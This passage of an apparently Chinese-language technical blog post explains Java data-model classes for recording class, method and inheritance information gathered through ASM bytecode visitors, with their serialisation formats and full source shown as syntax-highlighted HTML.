class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassReference</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;          <span class="comment">// 类名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String superClass;    <span class="comment">// 父类名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String[] interfaces;  <span class="comment">// 接口</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">boolean</span> isInterface;  <span class="comment">// 是否为接口</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Member[] members;     <span class="comment">// 字段/属性/成员</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Member</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String name;                  <span class="comment">// 名称</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> modifiers;                <span class="comment">// 访问修饰符</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> ClassReference.Handle type;   <span class="comment">// 所属类</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Member</span><span class="params">(String name, <span class="type">int</span> modifiers, Handle type)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="built_in">this</span>.modifiers = modifiers;</span><br><span class="line">            <span class="built_in">this</span>.type = type;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getModifiers</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> modifiers;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Handle <span class="title function_">getType</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClassReference</span><span class="params">(String name, String superClass, String[] interfaces, <span class="type">boolean</span> isInterface, Member[] members)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.superClass = superClass;</span><br><span class="line">        <span class="built_in">this</span>.interfaces = interfaces;</span><br><span class="line">        <span class="built_in">this</span>.isInterface = isInterface;</span><br><span class="line">        <span class="built_in">this</span>.members = members;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSuperClass</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> superClass;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String[] getInterfaces() &#123;</span><br><span class="line">        <span class="keyword">return</span> interfaces;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isInterface</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isInterface;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Member[] getMembers() &#123;</span><br><span class="line">        <span class="keyword">return</span> members;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Handle <span class="title function_">getHandle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Handle</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Handle</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String name;  <span class="comment">// 类名</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Handle</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span> == o) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (o == <span class="literal">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">Handle</span> <span class="variable">handle</span> <span class="operator">=</span> (Handle) o;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> name != <span class="literal">null</span> ? name.equals(handle.name) : handle.name == <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name != <span class="literal">null</span> ? name.hashCode() : <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义<strong>类信息</strong>的读写格式：<code>类名 父类名 接口A,接口B,接口C 是否为接口 字段1!字段1访问标志!字段1类型!字段2!字段2访问标志!字段2类型</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Factory</span> <span class="keyword">implements</span> <span class="title class_">DataFactory</span>&lt;ClassReference&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ClassReference <span class="title function_">parse</span><span class="params">(String[] fields)</span> &#123;</span><br><span class="line">        String[] interfaces;</span><br><span class="line">        <span class="keyword">if</span> (fields[<span class="number">2</span>].equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            interfaces = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            interfaces = fields[<span class="number">2</span>].split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String[] memberEntries = fields[<span class="number">4</span>].split(<span class="string">&quot;!&quot;</span>);</span><br><span class="line">        Member[] members = <span class="keyword">new</span> <span class="title class_">Member</span>[memberEntries.length / <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; members.length; i++) &#123;</span><br><span class="line">            members[i] = <span class="keyword">new</span> <span class="title class_">Member</span>(memberEntries[<span class="number">3</span> * i], Integer.parseInt(memberEntries[<span class="number">3</span> * i + <span class="number">1</span>]),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(memberEntries[<span class="number">3</span> * i + <span class="number">2</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ClassReference</span>(</span><br><span class="line">                fields[<span class="number">0</span>],</span><br><span class="line">                fields[<span class="number">1</span>].equals(<span class="string">&quot;&quot;</span>) ? <span class="literal">null</span> : fields[<span class="number">1</span>],</span><br><span class="line">                interfaces,</span><br><span class="line">                Boolean.parseBoolean(fields[<span class="number">3</span>]),</span><br><span class="line">                members);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(ClassReference obj) &#123;</span><br><span class="line">        String interfaces;</span><br><span class="line">        <span class="keyword">if</span> (obj.interfaces.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">interfacesSb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="keyword">for</span> (String iface : obj.interfaces) &#123;</span><br><span class="line">                interfacesSb.append(<span class="string">&quot;,&quot;</span>).append(iface);</span><br><span class="line">            &#125;</span><br><span class="line">            interfaces = interfacesSb.substring(<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            interfaces = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">members</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (Member member : obj.members) &#123;</span><br><span class="line">            members.append(<span class="string">&quot;!&quot;</span>).append(member.getName())</span><br><span class="line">                    .append(<span class="string">&quot;!&quot;</span>).append(Integer.toString(member.getModifiers()))</span><br><span class="line">                    .append(<span class="string">&quot;!&quot;</span>).append(member.getType().getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">                obj.name,</span><br><span class="line">                obj.superClass,</span><br><span class="line">                interfaces,</span><br><span class="line">                Boolean.toString(obj.isInterface),</span><br><span class="line">                members.length() == <span class="number">0</span> ? <span class="literal">null</span> : members.substring(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-MethodReference"><a href="#4-MethodReference" class="headerlink" title="4. MethodReference"></a>4. MethodReference</h3><p>定义<strong>方法信息</strong>的描述方式，同样使用 asm 访问者记录。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MethodReference</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ClassReference.Handle classReference; <span class="comment">// 所属类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;                          <span class="comment">// 方法名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String desc;                          <span class="comment">// 描述符</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">boolean</span> isStatic;                     <span class="comment">// 是否为静态方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MethodReference</span><span class="params">(ClassReference.Handle classReference, String name, String desc, <span class="type">boolean</span> isStatic)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.classReference = classReference;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.desc = desc;</span><br><span class="line">        <span class="built_in">this</span>.isStatic = isStatic;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ClassReference.Handle <span class="title function_">getClassReference</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> classReference;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDesc</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isStatic</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isStatic;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Handle <span class="title function_">getHandle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Handle</span>(classReference, name, desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Handle</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> ClassReference.Handle classReference; <span class="comment">// 所属类</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String name;                          <span class="comment">// 方法名</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String desc;                          <span class="comment">// 描述符</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Handle</span><span class="params">(ClassReference.Handle classReference, String name, String desc)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.classReference = classReference;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="built_in">this</span>.desc = desc;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> ClassReference.Handle <span class="title function_">getClassReference</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> classReference;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getDesc</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> desc;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span> == o) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (o == <span class="literal">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">Handle</span> <span class="variable">handle</span> <span class="operator">=</span> (Handle) o;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classReference != <span class="literal">null</span> ? !classReference.equals(handle.classReference) : handle.classReference != <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span> (name != <span class="literal">null</span> ? !name.equals(handle.name) : handle.name != <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span> desc != <span class="literal">null</span> ? desc.equals(handle.desc) : handle.desc == <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> classReference != <span class="literal">null</span> ? classReference.hashCode() : <span class="number">0</span>;</span><br><span class="line">            result = <span class="number">31</span> * result + (name != <span class="literal">null</span> ? name.hashCode() : <span class="number">0</span>);</span><br><span class="line">            result = <span class="number">31</span> * result + (desc != <span class="literal">null</span> ? desc.hashCode() : <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义<strong>方法信息</strong>的读写格式：<code>类名 方法名 方法描述符 是否为静态方法</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Factory</span> <span class="keyword">implements</span> <span class="title class_">DataFactory</span>&lt;MethodReference&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodReference <span class="title function_">parse</span><span class="params">(String[] fields)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MethodReference</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(fields[<span class="number">0</span>]),</span><br><span class="line">                fields[<span class="number">1</span>],</span><br><span class="line">                fields[<span class="number">2</span>],</span><br><span class="line">                Boolean.parseBoolean(fields[<span class="number">3</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(MethodReference obj) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;</span><br><span class="line">                obj.classReference.getName(),</span><br><span class="line">                obj.name,</span><br><span class="line">                obj.desc,</span><br><span class="line">                Boolean.toString(obj.isStatic),</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-inheritanceMap"><a href="#5-inheritanceMap" class="headerlink" title="5. inheritanceMap"></a>5. inheritanceMap</h3><p>定义<strong>继承信息</strong>的描述方式，包括 <code>子类-&gt;父类集合</code>、<code>父类-&gt;子类集合</code> 两个 Map 类型变量，根据类信息得出，具体实现在 <code>InheritanceMap</code> 类中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InheritanceMap</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; inheritanceMap;    <span class="comment">// 子类-&gt;父类集合</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; subClassMap;       <span class="comment">// 父类-&gt;子类集合</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 构造函数，从 `子类-&gt;父类集合` 得出 `父类-&gt;子类集合`</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inheritanceMap 继承关系</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InheritanceMap</span><span class="params">(Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; inheritanceMap)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.inheritanceMap = inheritanceMap;</span><br><span class="line">        subClassMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; entry : inheritanceMap.entrySet()) &#123;</span><br><span class="line">            ClassReference.<span class="type">Handle</span> <span class="variable">child</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            <span class="keyword">for</span> (ClassReference.Handle parent : entry.getValue()) &#123;</span><br><span class="line">                <span class="comment">// 如果 key 不存在，则创建，最后返回 value</span></span><br><span class="line">                subClassMap.computeIfAbsent(parent, k -&gt; <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;()).add(child);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Set&lt;Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt;&gt; entrySet() &#123;</span><br><span class="line">        <span class="keyword">return</span> inheritanceMap.entrySet();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 返回父类集合</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz 目标类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;ClassReference.Handle&gt; getSuperClasses(ClassReference.Handle clazz) &#123;</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; parents = inheritanceMap.get(clazz);</span><br><span class="line">        <span class="keyword">if</span> (parents == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Collections.unmodifiableSet(parents);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断目标父类是否为目标子类的父类</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz      目标子类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> superClass 目标父类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSubclassOf</span><span class="params">(ClassReference.Handle clazz, ClassReference.Handle superClass)</span> &#123;</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; parents = inheritanceMap.get(clazz);</span><br><span class="line">        <span class="keyword">if</span> (parents == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> parents.contains(superClass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 返回子类集合</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz 目标类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;ClassReference.Handle&gt; getSubClasses(ClassReference.Handle clazz) &#123;</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; subClasses = subClassMap.get(clazz);</span><br><span class="line">        <span class="keyword">if</span> (subClasses == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Collections.unmodifiableSet(subClasses);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 存储继承关系：子类-&gt;父类集合</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// inheritanceMap.dat 数据格式：</span></span><br><span class="line">        <span class="comment">// 类名 父类或超类或接口类1 父类或超类或接口类2 父类或超类或接口类3 ...</span></span><br><span class="line">        DataLoader.saveData(Paths.get(<span class="string">&quot;inheritanceMap.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">InheritanceMapFactory</span>(), inheritanceMap.entrySet());</span><br><span class="line">    